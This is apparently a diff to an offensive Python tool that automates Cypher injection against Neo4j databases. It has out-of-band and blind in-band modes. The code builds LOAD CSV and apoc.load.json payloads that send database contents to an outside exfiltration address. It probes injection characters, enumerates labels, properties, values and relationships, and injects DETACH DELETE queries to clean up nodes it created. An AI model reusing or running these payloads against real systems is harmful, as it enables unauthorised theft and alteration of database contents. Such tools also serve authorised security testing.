@@ -51,7 +51,6 @@ def get_data(timeout=5):
 
 
     except queue.Empty:
-        print(colored("[!] Injection failed, did not receive request from listener.", "red"))
         return None
 
 
@@ -195,8 +194,8 @@ class oob_Neo4jInjector:
         self.parameters = parameters
         self.cookie = cookie if cookie else ""
         self.headers = {'User-Agent': 'curl/8.5.0', 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': self.cookie}
-        self.proxies = {}
-        #self.proxies = {'http': 'http://127.0.0.1:8080'}
+        #self.proxies = {}
+        self.proxies = {'http': 'http://127.0.0.1:8080'}
         self.exfil_payload = ""
         self.working_char = "UNDEFINED"
 
@@ -249,7 +248,7 @@ class oob_Neo4jInjector:
         animation = "|/-\\"
         anim_index = 0
         random.seed(time.strftime("%H:%M:%S", time.localtime()))
-        self.random_num = random.randint(0, 999)
+        self.random_num = random.randint(999, 9999) * -1
         csv_exfil = f"LOAD CSV FROM '{self.exfil_ip}/?data='+exfilData as l RETURN 1337 as x//"
         apoc_exfil = f"CALL apoc.load.json('{self.exfil_ip}/?data='+exfilData) YIELD value RETURN 1337 as x//"
         csv = False
@@ -259,9 +258,9 @@ class oob_Neo4jInjector:
         injection_characters = [
             f"{self.random_num}'",
             f"{self.random_num}\"",
-            f"{self.random_num}')}}",
-            f"{self.random_num}\"}}",
-            f"{self.random_num}"
+            f"{self.random_num}'}})",
+            f"{self.random_num}\"}})",
+            f"{self.random_num}1"
         ]
         for injection_character in injection_characters:
             print(f"[{animation[anim_index % len(animation)]}] Checking injectability with LOAD CSV", end='\r', flush=True)
@@ -314,6 +313,8 @@ class oob_Neo4jInjector:
             self.exfil_payload = csv_exfil
             print(" " * 500, end='\r')
             return False
+    
+
         
     def get_version(self):
         print("\n[*] Version Check [*]")
@@ -369,6 +370,14 @@ class oob_Neo4jInjector:
                 print(f"[++] {pr0perty}")
 
         return properties_dict
+
+    def find_node_count(self):
+        # used for cleanup
+        self.inject_payload(f" RETURN 1 as x UNION MATCH (x) WITH COUNT(DISTINCT x) as exfilData {self.exfil_payload}")
+        node_count = get_data()  
+
+        return node_count
+
 
     def dump_values(self, properties_dict):
         for label, properties in properties_dict.items():
@@ -433,15 +442,19 @@ class oob_Neo4jInjector:
                 if regex_rel_type == rel_type:
                     print(f"[++] {rel}")
 
-    def clean_up(self):
-        # fix this
-        self.inject_payload(f" RETURN 1 as x UNION MATCH (n) WHERE ANY(key IN keys(n) WHERE n[key] IN [{self.random_num}, '{self.random_num}']) AND NOT EXISTS ((n)--()) DETACH DELETE n RETURN 1337 as x//")
+    def clean_up(self, old_node_count):
+        node_count = self.find_node_count()
+        if old_node_count != node_count:
+            print(f"\n[*] OLD: {old_node_count}, NEW: {node_count}")
+            print(colored("[!] Detected an increase in node count, probably injected into a CREATE clause, cleaning up...", "yellow"))
+            self.inject_payload(f" RETURN 1 as x UNION MATCH (n) WHERE ANY(key IN keys(n) WHERE n[key] IN [{self.random_num}, '{self.random_num}']) AND NOT EXISTS ((n)--()) DETACH DELETE n RETURN 1337 as x//")
+        else:
+            print("done, no increase in node count")
 
     def oob_dump_all(self):
         labels = self.dump_labels()
         properties_dict = self.dump_properties(labels)
         values_dict = self.dump_values(properties_dict)
-
 
 
 class ib_Neo4jInjector:
@@ -533,7 +546,7 @@ class ib_Neo4jInjector:
             if (input(colored("Seems like something went wrong, continue? (y|N)", "red")).lower != "y"):
                 sys.exit()
         for injection_character in injection_characters:
-            print(f"[{animation[anim_index % len(animation)]}] Checking injectability", end='\r', flush=True)
+            print(f"[{animation[anim_index % len(animation)]}] Checking injectability [{injection_character}]", end='\r', flush=True)
             anim_index += 1
             injection_case = None
             self.working_char = injection_character
@@ -578,7 +591,7 @@ class ib_Neo4jInjector:
             anim_index += 1
             for response in responses:
                 if (self.check_true(response)):
-                    print(" " * 150, end='\r')
+                    print(" " * 70, end='\r')
                     return count_index
 
     def find_label_sizes(self, label_count):
@@ -598,7 +611,7 @@ class ib_Neo4jInjector:
                         break
                 if (break_flag):
                     break
-        print(" " * 150, end='\r')
+        print(" " * 70, end='\r')
         return label_sizes_dict
 
     def dump_labels(self, label_sizes):
@@ -622,7 +635,7 @@ class ib_Neo4jInjector:
                             break
                     if (break_flag):
                         break
-            print(" " * 150, end='\r')
+            print(" " * 70, end='\r')
             print(f"[+] {label}")
             labels.append(label)
         return labels
@@ -645,7 +658,7 @@ class ib_Neo4jInjector:
                         break
                 if (break_flag):
                     break
-        print(" " * 150, end='\r')
+        print(" " * 70, end='\r')
         return property_counts_dict
 
     def find_property_sizes(self, property_counts_dict):
@@ -670,7 +683,7 @@ class ib_Neo4jInjector:
                                 break  # Stop searching after finding the blind string for this property
                     if (break_flag):
                         break
-        print(" " * 150, end='\r')
+        print(" " * 70, end='\r')
         return property_sizes_dict
 
 
@@ -697,7 +710,7 @@ class ib_Neo4jInjector:
                                     break 
                         if (break_flag):
                             break
-                print(" " * 150, end='\r') 
+                print(" " * 70, end='\r') 
                 print(f"[++] {pr0perty}")
                 if label in properties_dict:
                     properties_dict[label].append(pr0perty)
@@ -727,7 +740,7 @@ class ib_Neo4jInjector:
                             break  # Stop searching after finding the blind string for this property
                     if (break_flag):
                         break
-        print(" " * 150, end='\r')       
+        print(" " * 70, end='\r')       
         return value_counts_dict
 
 
@@ -753,7 +766,7 @@ class ib_Neo4jInjector:
                                 break  # Found the size for this occurrence, no need to continue
                         if (break_flag):
                             break
-        print(" " * 150, end='\r')
+        print(" " * 70, end='\r')
         return value_sizes_dict
 
     def dump_values(self, value_sizes_dict):
@@ -789,7 +802,7 @@ class ib_Neo4jInjector:
                                     break  # Found the size for this occurrence, no need to continue
                             if (break_flag):
                                 break
-                    print(" " * 150, end='\r') 
+                    print(" " * 70, end='\r') 
                     print(f"[+++] {''.join(value.split('::')[1::])}")
 
                     values_dict[label][pr0perty][count_index] = value
@@ -836,7 +849,7 @@ class ib_Neo4jInjector:
             anim_index += 1
             for response in responses:
                 if (self.check_true(response)):
-                    print(" " * 150, end='\r')
+                    print(" " * 70, end='\r')
                     return count_index
 
     def find_rel_type_sizes(self, rel_type_counts):
@@ -856,7 +869,7 @@ class ib_Neo4jInjector:
                         break
                 if (break_flag):
                     break
-        print(" " * 150, end='\r')
+        print(" " * 70, end='\r')
         return rel_type_sizes_dict
 
     def dump_rel_types(self, rel_type_sizes_dict):
@@ -880,7 +893,7 @@ class ib_Neo4jInjector:
                             break
                     if (break_flag):
                         break
-            print(" " * 150, end='\r')
+            print(" " * 70, end='\r')
             print(f"[+] {rel_type}")
             rel_types.append(rel_type)
         return rel_types
@@ -902,7 +915,7 @@ class ib_Neo4jInjector:
                         break
                 if (break_flag):
                     break
-        print(" " * 150, end='\r')
+        print(" " * 70, end='\r')
         return rel_counts_dict
 
     def find_rel_sizes(self, rel_counts_dict):
@@ -926,11 +939,11 @@ class ib_Neo4jInjector:
                                 break  
                     if (break_flag):
                         break
-        print(" " * 150, end='\r')
+        print(" " * 70, end='\r')
         return rel_sizes_dict
 
     def dump_rel(self, rel_sizes_dict):
-        print(colored(f"\n[!] At this stage, we are unaware relationship direction, we have to verify it", "yellow"))
+        print(colored(f"\n[!] At this stage, we are unaware relationship direction, we have to verify it\n", "yellow"))
         valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
         rels_dict = {}
         animation = "|/-\\"
@@ -952,7 +965,7 @@ class ib_Neo4jInjector:
                                     break 
                         if (break_flag):
                             break
-                print(" " * 150, end='\r') 
+                print(" " * 70, end='\r') 
                 print(f"[++] {rel}")
                 rels_dict[rel_type] = rel
         return rels_dict 
@@ -977,8 +990,8 @@ class ib_Neo4jInjector:
                 if (break_flag):
                     break
                 
-        print(" " * 150, end='\r')
-        write_list_to_file(found_relationships)
+        print(" " * 70, end='\r')
+        write_list_to_file(verified_rels)
 
         print(f"\n[*] available relationships [{len(verified_rels)}]")
         for rel_type in rels_dict.keys():
@@ -1083,8 +1096,11 @@ def main():
         injector.get_version()
         
         if args.dump_all:
+            old_node_count = injector.find_node_count()
             injector.oob_dump_all()
             injector.dump_rels()
+            injector.clean_up(old_node_count)
+            
 
         elif args.labels:
             labels = injector.dump_labels()
@@ -1107,9 +1123,10 @@ def main():
             injector.dump_values(properties_dict)
 
         elif args.relationships:
+            old_node_count = injector.find_node_count()
             injector.dump_rels()
+            injector.clean_up(old_node_count)
 
-        injector.clean_up()
         listener.stop_listener()
         listener_thread.join()
 
